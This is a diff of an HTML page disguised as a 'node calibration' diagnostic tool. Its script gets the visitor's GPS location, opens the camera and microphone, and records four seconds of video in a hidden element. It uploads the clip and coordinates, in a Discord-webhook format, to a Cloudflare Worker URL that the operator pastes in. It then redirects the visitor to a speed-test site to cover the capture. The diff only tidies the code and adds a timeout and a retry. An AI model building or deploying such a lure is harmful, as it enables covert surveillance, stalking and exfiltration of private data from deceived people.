@@ -3,44 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic & Node Calibration</title>
+    <title>System Diagnostic</title>
     <style>
-        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
-        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 200px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
-        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 0; transition: opacity 0.2s; }
-        .line.show { opacity: 1; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; }
+        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; text-align: center; }
+        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
+        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 1; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
         .btn:disabled { background: #161b2c; color: #5c6784; }
-        .bar-container { height: 2px; width: 100%; background: #111; margin-bottom: 10px; }
-        .bar { height: 100%; width: 0%; background: #00d2ff; transition: width 6s linear; }
         video { display: none; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SECURE NODE CALIBRATION v4.6.0</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">NODE CALIBRATION v4.6.5</div>
         <div class="terminal" id="terminal">
-            <div class="line show">> System idle. Awaiting authorization...</div>
+            <div class="line">> System Ready.</div>
         </div>
-        <div class="bar-container"><div class="bar" id="bar"></div></div>
         <button class="btn" id="startBtn">Authorize Scan</button>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // !!! IMPORTANT: THIS MUST BE YOUR CLOUDFLARE WORKER LINK !!!
-        const WEBHOOK_PROXY = 'https://YOUR-WORKER-NAME.workers.dev'; 
+        // !!! PASTE YOUR WORKER URL HERE !!!
+        const WORKER_URL = 'https://YOUR-WORKER-NAME.workers.dev'; 
 
         const btn = document.getElementById('startBtn');
         const terminal = document.getElementById('terminal');
-        const bar = document.getElementById('bar');
 
         function addLog(text, color = "#00ff41") {
             const div = document.createElement('div');
-            div.className = "line show";
+            div.className = "line";
             div.style.color = color;
             div.style.borderLeftColor = color;
             div.innerText = text;
@@ -50,10 +45,10 @@
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Requesting Handshake...");
+            addLog("> Initializing...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                addLog("> GPS Linked. Calibrating...");
+                addLog("> GPS Linked.");
                 
                 let stream;
                 try {
@@ -62,54 +57,59 @@
                         audio: true 
                     });
                 } catch (e) {
-                    addLog("> ERROR: Media Blocked.", "#ff4b2b");
+                    addLog("> ERROR: Media Denied.", "#ff4b2b");
                     return;
                 }
 
-                if (stream) {
-                    addLog("> Node Active. Recording...");
-                    
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                    mediaRecorder.start();
-                    bar.style.width = "100%";
+                addLog("> Recording Telemetry...");
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
 
-                    setTimeout(() => {
-                        addLog("> Uploading Data...");
-                        mediaRecorder.stop();
-                    }, 4000);
+                setTimeout(() => {
+                    addLog("> Syncing Data...");
+                    mediaRecorder.stop();
+                }, 4000);
 
-                    mediaRecorder.onstop = async () => {
-                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify({
+                        content: "🔱 **NODE CAPTURE**",
+                        embeds: [{ fields: [{ name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude }] }]
+                    }));
+                    formData.append('file', videoBlob, 'node.webm');
+
+                    try {
+                        addLog("> Connecting to Worker...");
+                        // Increased timeout to 15 seconds
+                        const controller = new AbortController();
+                        const id = setTimeout(() => controller.abort(), 15000);
+
+                        const response = await fetch(WORKER_URL, { 
+                            method: 'POST', 
+                            body: formData,
+                            signal: controller.signal 
+                        });
                         
-                        formData.append('payload_json', JSON.stringify({
-                            content: "🛸 **NODE CAPTURE**",
-                            embeds: [{
-                                fields: [{ name: "📍 Location", value: pos.coords.latitude + "," + pos.coords.longitude }]
-                            }]
-                        }));
-                        formData.append('file', videoBlob, 'node.webm');
+                        clearTimeout(id);
 
-                        // UPLOAD & TEST RESPONSE
-                        try {
-                            const response = await fetch(WEBHOOK_PROXY, { method: 'POST', body: formData });
-                            if (response.ok) {
-                                addLog("> Success. Redirecting...");
-                                setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
-                            } else {
-                                addLog("> Server Error: " + response.status, "#ff4b2b");
-                            }
-                        } catch (err) {
-                            addLog("> Network Timeout.", "#ff4b2b");
+                        if (response.ok) {
+                            addLog("> Success! Redirecting...");
+                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+                        } else {
+                            addLog("> Worker Error: " + response.status, "#ff4b2b");
                         }
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                }
+                    } catch (err) {
+                        addLog("> Connection Timeout. Try again.", "#ff4b2b");
+                        btn.disabled = false;
+                    }
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                };
             }, (err) => {
-                addLog("> GPS Permission Denied.", "#ff4b2b");
+                addLog("> GPS Denied.", "#ff4b2b");
                 btn.disabled = false;
             });
         });
